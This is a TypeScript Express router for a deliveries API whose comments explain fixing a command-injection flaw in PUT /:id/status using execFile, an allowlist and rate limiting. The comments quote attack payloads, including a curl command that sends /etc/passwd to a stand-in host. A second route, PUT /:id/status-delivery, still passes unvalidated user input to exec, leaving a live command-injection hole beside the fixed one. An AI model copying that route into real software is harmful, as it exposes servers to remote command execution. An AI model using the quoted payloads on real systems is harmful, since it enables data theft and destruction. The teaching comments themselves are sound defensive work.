/**
 * @swagger
 * tags:
 *   name: Deliveries
 *   description: API endpoints for managing deliveries
 */

/**
 * @swagger
 * /api/deliveries:
 *   get:
 *     summary: Returns all deliveries
 *     tags: [Deliveries]
 *     responses:
 *       200:
 *         description: List of all deliveries
 *         content:
 *           application/json:
 *             schema:
 *               type: array
 *               items:
 *                 $ref: '#/components/schemas/Delivery'
 *   post:
 *     summary: Create a new delivery
 *     tags: [Deliveries]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             $ref: '#/components/schemas/Delivery'
 *     responses:
 *       201:
 *         description: Delivery created successfully
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Delivery'
 *
 * /api/deliveries/{id}:
 *   get:
 *     summary: Get a delivery by ID
 *     tags: [Deliveries]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *         description: Delivery ID
 *     responses:
 *       200:
 *         description: Delivery found
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Delivery'
 *       404:
 *         description: Delivery not found
 *   put:
 *     summary: Update a delivery
 *     tags: [Deliveries]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *         description: Delivery ID
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             $ref: '#/components/schemas/Delivery'
 *     responses:
 *       200:
 *         description: Delivery updated successfully
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Delivery'
 *       404:
 *         description: Delivery not found
 *   delete:
 *     summary: Delete a delivery
 *     tags: [Deliveries]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *         description: Delivery ID
 *     responses:
 *       204:
 *         description: Delivery deleted successfully
 *       404:
 *         description: Delivery not found
 *
 * /api/deliveries/{id}/status:
 *   put:
 *     summary: Update the status of a delivery
 *     tags: [Deliveries]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *         description: Delivery ID
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - status
 *             properties:
 *               status:
 *                 type: string
 *                 description: The new status of the delivery
 *               deliveryPartner:
 *                 type: string
 *                 description: Optional delivery partner to notify via the notify-service about the status update
 *     responses:
 *       200:
 *         description: Delivery status updated successfully
 *         content:
 *           application/json:
 *             schema:
 *               oneOf:
 *                 - $ref: '#/components/schemas/Delivery'
 *                 - type: object
 *                   properties:
 *                     delivery:
 *                       $ref: '#/components/schemas/Delivery'
 *                     commandOutput:
 *                       type: string
 *                       description: Output from the notify-service command
 *       404:
 *         description: Delivery not found
 *       500:
 *         description: Error executing notify command
 */

import express from 'express';
import { Delivery } from '../models/delivery';
// ✅ SECURITY FIX: We import `execFile` instead of `exec`.
//
// WHY THIS MATTERS — The difference between `exec` and `execFile`:
//
//   ❌ `exec(command)`:
//      - Spawns a SHELL (e.g. /bin/sh -c "...") and passes the whole string to it.
//      - The shell interprets special characters like ; | & $ ` ( ) < > etc.
//      - If any user-controlled data is interpolated into the command string,
//        an attacker can inject additional shell commands.
//      - Example attack payload: "; cat /etc/passwd"  →  the shell runs BOTH
//        the intended command AND `cat /etc/passwd`.
//
//   ✅ `execFile(file, args)`:
//      - Spawns the target binary DIRECTLY (no shell intermediary).
//      - Arguments are passed as a plain array — the OS kernel handles them,
//        not a shell — so shell metacharacters have no special meaning.
//      - Even if a user passes "; rm -rf /" as an argument, it is treated as a
//        single literal string argument to the program, not as shell syntax.
//
// TAKEAWAY: Whenever you need to run an external program with user-supplied
// data, always prefer `execFile` (or `spawn` with `shell: false`, the default)
// over `exec`.  Reserve `exec` only for fully trusted, hard-coded commands that
// never contain user input.
import { exec, execFile } from 'child_process';
// ✅ SECURITY FIX: Import rateLimit to protect the endpoint that spawns a
// subprocess from being abused.
//
// WHY RATE-LIMIT AN ENDPOINT THAT RUNS A PROCESS?
//   Without a rate limit, an attacker (or a buggy client) can send thousands of
//   requests per second to PUT /deliveries/:id/status.  Each valid request
//   spawns a new `notify` subprocess.  This can:
//     • Exhaust OS process/file-descriptor limits (denial of service).
//     • Consume significant CPU/memory on the server.
//     • Amplify any remaining command-injection risk by allowing rapid iteration
//       of attack payloads.
//
//   A rate limit caps how many times a single IP can trigger the subprocess
//   within a time window, making brute-force and resource-exhaustion attacks
//   impractical.
import rateLimit from 'express-rate-limit';
import { getDeliveriesRepository } from '../repositories/deliveriesRepo';
import { NotFoundError } from '../utils/errors';

// ─── Input-validation helper ─────────────────────────────────────────────────
//
// DEFENCE-IN-DEPTH: Even though `execFile` already prevents shell injection,
// we still validate the `deliveryPartner` value.  This is good practice because:
//   1. It enforces a clear, documented contract for callers of the API.
//   2. It prevents unexpected/nonsensical values from reaching the subprocess.
//   3. If the code is ever refactored back to `exec`, the validation acts as a
//      last-resort safety net.
//
// The allowed pattern restricts the partner name to:
//   • Latin letters (A-Z, a-z)
//   • Digits (0-9)
//   • Hyphens (-), underscores (_), spaces ( ), and dots (.)
//
// Characters that MUST be blocked (shell metacharacters and path traversal):
//   ; | & $ ` ( ) < > ' " \ / ! # % ^ * ? [ ] { } ~ newlines tabs etc.
//
// If your business rules require other characters, expand the allowlist
// carefully — never just accept any character or use a blocklist.
const SAFE_DELIVERY_PARTNER_PATTERN = /^[A-Za-z0-9 ._-]+$/;

/**
 * Validates that a delivery partner name contains only safe characters.
 *
 * @param name - The raw value supplied by the API caller.
 * @returns `true` when the name is safe to use as an argument to `execFile`.
 *
 * LEARNING NOTE: Input validation should always use an *allowlist* (only permit
 * known-safe characters) rather than a *blocklist* (try to forbid known-bad
 * characters).  Blocklists are fragile — attackers routinely find characters or
 * encodings that bypass them.
 */
function isValidDeliveryPartner(name: string): boolean {
  // Reject empty strings — an empty argument to the notify binary is likely
  // a programmer error and should be caught early.
  if (!name || name.trim().length === 0) {
    return false;
  }

  // Reject names that are longer than 100 characters to prevent abuse.
  if (name.length > 100) {
    return false;
  }

  // Test against the allowlist pattern defined above.
  return SAFE_DELIVERY_PARTNER_PATTERN.test(name);
}


const router = express.Router();

// ─── Rate limiter for the status-update endpoint ──────────────────────────────
//
// This limiter applies ONLY to PUT /:id/status — the one route that can spawn
// a subprocess.  Other delivery endpoints (GET, POST, DELETE) are not affected.
//
// Configuration rationale:
//   windowMs: 60_000  → 1-minute sliding window.
//   max: 20           → A single IP may trigger at most 20 subprocess spawns
//                       per minute.  Adjust downward if the `notify` binary is
//                       expensive to run.
//   standardHeaders   → Sends RateLimit-* response headers (RFC 6585 draft 7)
//                       so well-behaved clients can back off gracefully.
//   legacyHeaders     → Suppresses the older X-RateLimit-* headers to avoid
//                       header duplication.
//   message           → Human-readable error returned when the limit is hit.
//                       Avoid revealing internal details.
const notifyRateLimiter = rateLimit({
  windowMs: 60_000,   // 1 minute
  max: 20,            // 20 requests per IP per window
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many status-update requests. Please try again later.' },
});

// Create a new delivery
router.post('/', async (req, res, next) => {
  try {
    const repo = await getDeliveriesRepository();
    const newDelivery = await repo.create(req.body as Omit<Delivery, 'deliveryId'>);
    res.status(201).json(newDelivery);
  } catch (error) {
    next(error);
  }
});

// Get all deliveries
router.get('/', async (req, res, next) => {
  try {
    const repo = await getDeliveriesRepository();
    const deliveries = await repo.findAll();
    res.json(deliveries);
  } catch (error) {
    next(error);
  }
});

// Get a delivery by ID
router.get('/:id', async (req, res, next) => {
  try {
    const repo = await getDeliveriesRepository();
    const delivery = await repo.findById(parseInt(req.params.id));
    if (delivery) {
      res.json(delivery);
    } else {
      res.status(404).send('Delivery not found');
    }
  } catch (error) {
    next(error);
  }
});

// Update the status of a delivery
// The notifyRateLimiter middleware runs first — if the caller has exceeded the
// allowed request rate it short-circuits with 429 Too Many Requests before any
// business logic or subprocess is reached.
router.put('/:id/status', notifyRateLimiter, async (req, res, next) => {
  try {
    const { status, deliveryPartner } = req.body;
    const repo = await getDeliveriesRepository();
    const delivery = await repo.findById(parseInt(req.params.id));

    if (delivery) {
      const updatedDelivery = await repo.updateStatus(parseInt(req.params.id), status);

      if (deliveryPartner) {
        // ─── SECURITY FIX: Validate input BEFORE using it ──────────────────────
        //
        // ❌ VULNERABLE (original code):
        //   exec(`notify ${deliveryPartner}`, callback)
        //
        //   An attacker who controls `deliveryPartner` could send a value like:
        //     "acme; curl https://evil.example/steal?data=$(cat /etc/passwd)"
        //   The shell would execute BOTH `notify acme` AND the curl command,
        //   exfiltrating the contents of /etc/passwd to the attacker's server.
        //
        // ✅ FIXED (this code):
        //   Step 1 — Reject any value that does not match our allowlist.
        //            This stops clearly malicious input before it reaches the OS.
        //   Step 2 — Use `execFile` so the OS kernel receives the argument as a
        //            plain string with no shell interpretation at all.
        //
        // ALWAYS validate user-supplied data as close to the source as possible
        // (i.e., here in the route handler, not deep inside a helper function
        // that might be called from other contexts without validation).
        if (!isValidDeliveryPartner(deliveryPartner)) {
          // Return 400 Bad Request — the client sent an invalid value.
          // Do NOT include the raw user input in the error message to avoid
          // leaking it in logs or confusing downstream systems.
          return res.status(400).json({
            error: 'Invalid deliveryPartner value. Only letters, digits, spaces, hyphens, underscores, and dots are allowed (max 100 characters).',
          });
        }

        // ✅ SECURE: Pass `deliveryPartner` as a separate argument in an array.
        //
        // `execFile('notify', ['acme; evil command'])` launches the `notify`
        // binary with a single argv[1] equal to the literal string
        // "acme; evil command" — the semicolon is NOT interpreted as a command
        // separator because there is no shell involved.
        //
        // Compare with the vulnerable version:
        //   exec(`notify ${deliveryPartner}`)
        //   → /bin/sh -c "notify acme; evil command"   ← shell runs two commands!
        execFile('notify', [deliveryPartner], (error, stdout) => {
          if (error) {
            console.error(`Error executing command: ${error}`);
            return res.status(500).json({ error: error.message });
          }
          res.json({ delivery: updatedDelivery, commandOutput: stdout });
        });
      } else {
        res.json(updatedDelivery);
      }
    } else {
      res.status(404).send('Delivery not found');
    }
  } catch (error) {
    if (error instanceof NotFoundError) {
      res.status(404).send('Delivery not found');
    } else {
      next(error);
    }
  }
});

// Update the status of a delivery
router.put('/:id/status-delivery', async (req, res, next) => {
  try {
    const { status, deliveryPartner } = req.body;
    const repo = await getDeliveriesRepository();
    const delivery = await repo.findById(parseInt(req.params.id));

    if (delivery) {
      const updatedDelivery = await repo.updateStatus(parseInt(req.params.id), status);

      if (deliveryPartner) {
        exec(`notify ${deliveryPartner}`, (error, stdout) => {
          if (error) {
            console.error(`Error executing command: ${error}`);
            return res.status(500).json({ error: error.message });
          }
          res.json({ delivery: updatedDelivery, commandOutput: stdout });
        });
      } else {
        res.json(updatedDelivery);
      }
    } else {
      res.status(404).send('Delivery not found');
    }
  } catch (error) {
    if (error instanceof NotFoundError) {
      res.status(404).send('Delivery not found');
    } else {
      next(error);
    }
  }
});

// Update a delivery by ID
router.put('/:id', async (req, res, next) => {
  try {
    const repo = await getDeliveriesRepository();
    const updatedDelivery = await repo.update(parseInt(req.params.id), req.body);
    res.json(updatedDelivery);
  } catch (error) {
    if (error instanceof NotFoundError) {
      res.status(404).send('Delivery not found');
    } else {
      next(error);
    }
  }
});

// Delete a delivery by ID
router.delete('/:id', async (req, res, next) => {
  try {
    const repo = await getDeliveriesRepository();
    await repo.delete(parseInt(req.params.id));
    res.status(204).send();
  } catch (error) {
    if (error instanceof NotFoundError) {
      res.status(404).send('Delivery not found');
    } else {
      next(error);
    }
  }
});

export default router;
